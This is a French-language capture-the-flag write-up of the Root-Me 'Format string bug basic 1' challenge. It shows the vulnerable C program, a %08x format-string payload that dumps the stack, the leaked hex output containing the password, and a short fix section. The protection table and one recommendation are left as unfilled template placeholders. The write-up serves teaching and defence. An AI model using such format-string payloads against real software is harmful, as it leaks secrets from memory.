# L’épopée Root-Me : \[App Système\] | \[ELF x86 - Format string bug basic 1\]

## 1. Informations Générales & Configuration de l'Environnement

| Protection | Nom complet | État | 
| ----- | ----- | ----- | 
| **PIE** | Position Independent Executable | \[✔️ / ❌\] | 
| **RelRO** | Read Only relocations | \[✔️ / ❌\] | 
| **NX** | Pile non exécutable | \[✔️ / ❌\] | 
| **Heap exec** | Tas non exécutable | \[✔️ / ❌\] | 
| **ASLR** | Distribution aléatoire de l'espace d'adressage | \[✔️ / ❌\] | 
| **SF** | Source Fortification | \[✔️ / ❌\] | 
| **SSP** | Stack-Smashing Protection | \[✔️ / ❌\] | 
| **SRC** | Accès au code source | \[✔️ / ❌\] | 

## 2. Analyse du Code Source

```c
    #include <stdio.h>
    #include <unistd.h>
     
    int main(int argc, char *argv[]){
            FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
            char buffer[32];
            fgets(buffer, sizeof(buffer), secret);
            printf(argv[1]);
            fclose(secret);
            return 0;
    }
```

### Le challenge :

La première étape de ce challenge va être la lecture du code. Voici les informations notables :

* Le flag est stocké dans un fichier ouvert dans secret. 

* fgets récupère le contenu du fichier et le stocke dans buffer.

* printf lis directement le contenu du premier argument passé au programme

Une première faille semble me sauter aux yeux : printf lit bêtement ce qu'on lui donne, en passant un % en argument comme %d ça permettrait d'afficher quelque chose non prévu par le programme.

## 3. Exploitation & Démarche de Résolution

### Étape 1 : Déroulement basique du script

Tout d'abord, on va vérifier le déroulement basique du programme :

```bash
app-systeme-ch5@challenge02:~$ ./ch5 ma
ma
app-systeme-ch5@challenge02:~$ ./ch5 %d
32
app-systeme-ch5@challenge02:~$ ./ch5 %s
Erreur de segmentation
```

On voit plusieurs cas de figures :

* Comportement normal, affichage de l'argument.

* %d affiche un nombre qui semble aléatoire

* %s provoque un segfault.

### Étape 2 : Identification de la vulnérabilité

La vulnerabilité ici est un String bug basic, on utilise printf pour récupérer des valeurs censées être secrètes. 

### Étape 3 : Analyse du comportement

Ici, mon hypothèse est que en affichant quelque chose avec printf on lit directement ce qui est dans le buffer, en affichant avec %x on pourra avoir sous forme hexadécimale le contenu de buffer.

### Étape 4 : Exploitation

Maintenant que nous avons trouvé une solution, mettons la en pratique.

```bash
app-systeme-ch5@challenge02:~$ ./ch5 "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
00000020.0804b160.0804853d.00000009.bffffa3d.b7e19679.bffff904.b7fc1000.b7fc1000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.bffff904.bffff910.5716b000.bffff870.00000000.00000000.b7e01fa1.b7fc1000.b7fc1000.00000000.b7e01fa1.00000002.bffff904.bffff910.bffff894.00000001.00000000.b7fc1000.b7fe771a.b7fff000.00000000.b7fc1000.00000000.00000000.866e8485.b9a0a295.00000000.00000000.00000000.00000002.08048410.00000000.b7fecde0.b7fe7970.0804a000.00000002.08048410.00000000.08048442.08048526.00000002.bffff904.080485d0.08048630.b7fe7970.bffff8fc.b7fff940.00000002.bffffa3d.bffffa43.00000000.bffffd31.bffffd5c.bffffdb4.bffffdc5.bffffde7.bffffe2d.bffffe41.bffffe56.bffffe75.bffffe95.bffffed1.bffffee4.bfffff03.bfffff17.bfffff27.bfffff32.bfffff3a.bfffff52.bfffff71.bfffffee.00000000.00000020.b7fd6e5c.00000021.b7fd6000.00000010.1f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000009.00000007.b7fd8000.00000008.00000000.00000009.08048410.0000000b.00000451.0000000c.000004b5.0000000d.00000451.0000000e.00000451.00000017.00000001.00000019.bffffa1b.0000001a.00000000.0000001f.bffffff6.0000000f.bffffa2b.00000000.00000000.00000000.00000000.00000000.c3000000.325716b0.36fd3ccf.1ae989c7.6916ae7c.00363836.00000000.00000000.00000000.632f2e00.25003568.2e783830.78383025.3830252e.30252e78.252e7838.2e783830

```

Il suffit de traduire en ascii et le mot de passe est en poche.

## 4. Comment se protéger ?

Ici, l'erreur venait de printf qui lit de manière brute ce qu'on lui envoie.

Pour corriger ce problème, la solution est simplement d'afficher la variable en utilisant %s, ou bien d'utiliser puts() à la place de printf().

2. \[Recommandation de sécurité / correctif 2\]
